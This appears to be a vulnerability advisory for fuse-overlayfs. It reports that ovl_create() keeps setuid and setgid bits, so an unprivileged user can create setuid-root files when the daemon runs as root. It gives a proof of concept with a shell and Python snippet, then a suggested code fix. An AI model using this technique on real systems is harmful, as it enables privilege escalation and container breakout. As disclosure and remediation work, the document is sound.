# fuse-overlayfs: FUSE_CREATE passes user-controlled S_ISUID/S_ISGID to upper layer, enabling local privilege escalation

## Summary

`ovl_create()` in fuse-overlayfs passes the `mode` from `FUSE_CREATE` to `direct_create_file()` with only the umask stripped. `S_ISUID` and `S_ISGID` bits are preserved and applied to the upper-layer file via `safe_openat()`. When fuse-overlayfs runs as root (e.g., privileged container mode), an unprivileged user can create setuid-root files on the upper layer and escalate privileges.

## Details

In `main.c`, `ovl_create()` (around line 3872) calls:

```c
fd = direct_create_file(get_upper_layer(lo), ..., flags, mode & ~ctx->umask);
```

The expression `mode & ~ctx->umask` strips the umask bits but does **not** strip `S_ISUID` (04000) or `S_ISGID` (02000). The resulting mode is passed to `safe_openat()`, which calls `openat()` on the upper-layer filesystem.

When fuse-overlayfs runs as root, the upper-layer file is created as `root:root`. An unprivileged user's `open(path, O_CREAT|O_WRONLY, 04711)` produces a setuid-root file on the upper layer.

The kernel then sees `attr.uid=0` and `attr.mode` with `S_ISUID` set. On a mount without `nosuid`, executing this file escalates the caller to root.

## PoC

Prerequisites:
- fuse-overlayfs running as root with `allow_other`
- Upper layer on a native filesystem (e.g., ext4)

```bash
# Start fuse-overlayfs as root
mkdir -p /tmp/lower /tmp/upper /tmp/work /mnt/overlay
fuse-overlayfs -o lowerdir=/tmp/lower,upperdir=/tmp/upper,workdir=/tmp/work,allow_other /mnt/overlay

# As unprivileged user
python3 -c "
import os
fd = os.open('/mnt/overlay/exploit', os.O_CREAT | os.O_WRONLY | os.O_EXCL, 0o4711)
os.write(fd, open('/usr/bin/id', 'rb').read())
os.close(fd)
"

# Check upper layer
stat /tmp/upper/exploit
# mode=4711, uid=0, gid=0, S_ISUID set
```

## Impact

fuse-overlayfs is a core component of the Podman/Buildah rootless container ecosystem and is also used in privileged container configurations. When running in privileged mode (where the daemon has root on the host), this vulnerability allows a user inside the container to create setuid-root binaries on the upper layer.

Affected scenarios:
- Privileged Podman/Buildah containers using fuse-overlayfs for the overlay filesystem
- Any deployment where fuse-overlayfs runs as root with `allow_other` and the mount lacks `nosuid`
- Container breakout scenarios where upper-layer files are accessible from the host

## Suggested Fix

Strip `S_ISUID` and `S_ISGID` before passing the mode to `direct_create_file()`:

```c
/* In ovl_create(), before calling direct_create_file(): */
mode_t safe_mode = mode & ~ctx->umask;
safe_mode &= ~(S_ISUID | S_ISGID);

fd = direct_create_file(get_upper_layer(lo), ..., flags, safe_mode);
```

Alternatively, the sanitization can be applied inside `direct_create_file()` or `safe_openat()` for defense in depth. A caller-UID-aware approach would check `fuse_req_ctx(req)->uid` and only strip the bits for non-root callers.
